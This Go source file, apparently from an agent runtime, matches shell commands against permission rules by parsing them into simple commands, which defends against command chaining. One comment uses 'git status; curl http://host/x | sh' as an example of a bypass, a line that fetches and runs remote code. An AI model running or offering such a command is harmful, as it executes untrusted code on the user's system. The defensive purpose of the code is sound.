package permissions

import (
	"strings"

	"github.com/KPO-Tech/seshat-runtime/internal/shellparse"
	"github.com/KPO-Tech/seshat-runtime/internal/types"
)

// shellCommand returns the command line of a call to a tool that runs one, and
// whether the call is one.
func shellCommand(toolName string, input map[string]any) (string, bool) {
	switch toolName {
	case "bash", "monitor":
	default:
		return "", false
	}
	command, ok := input["command"].(string)
	if !ok || strings.TrimSpace(command) == "" {
		return "", false
	}
	return command, true
}

// Rules of a shell tool are compared with the command line the way a shell
// reads it, not as one piece of text. As text, the rule "git *" also matches
// "git status; curl http://host/x | sh".

// shellRestrictionMatcher is the matcher of a deny or an ask rule: it applies as
// soon as the line or any simple command in it matches, so "rm *" is caught in
// "ls; rm x" and in "echo $(rm x)".
func shellRestrictionMatcher(command string) func(ruleContent string) bool {
	return func(ruleContent string) bool {
		return shellparse.MatchesRestriction(command, func(candidate string) bool {
			return permissionRuleContentMatches(ruleContent, candidate)
		})
	}
}

// isExactRule reports whether a rule has no wildcard: it describes one text.
func isExactRule(ruleContent string) bool {
	_, prefix := legacyPrefixRule(strings.TrimSpace(ruleContent))
	return !hasWildcard(ruleContent) && !prefix
}

// findShellAllowRule finds the allow rule that covers a command line, or nil.
//
// A line is covered when every simple command in it is matched by some allow
// rule and the line holds nothing that runs something else or writes somewhere
// (a substitution, a redirection, a group): a chain is as safe as its weakest
// command. A rule with no wildcard also covers its own exact text, since the
// user approved that text, and a rule with no content allows the whole tool.
func (e *Engine) findShellAllowRule(pctx *PermissionContext, command string) *PermissionRule {
	e.rulesMu.RLock()
	defer e.rulesMu.RUnlock()

	var allow []PermissionRule
	for _, rule := range e.rules {
		if rule.Behavior != types.PermissionBehaviorAllow || !ruleMatchesToolName(rule, pctx.ToolName) {
			continue
		}
		content := strings.TrimSpace(rule.Value.RuleContent)
		if content == "" {
			matched := rule
			return &matched
		}
		if isExactRule(content) && permissionRuleContentMatches(content, command) {
			matched := rule
			return &matched
		}
		allow = append(allow, rule)
	}

	analysis := shellparse.Analyze(command)
	if analysis.Unsafe || len(analysis.Segments) == 0 {
		return nil
	}
	var first *PermissionRule
	for _, segment := range analysis.Segments {
		covered := false
		for i := range allow {
			if permissionRuleContentMatches(allow[i].Value.RuleContent, segment) {
				covered = true
				if first == nil {
					matched := allow[i]
					first = &matched
				}
				break
			}
		}
		if !covered {
			return nil
		}
	}
	return first
}
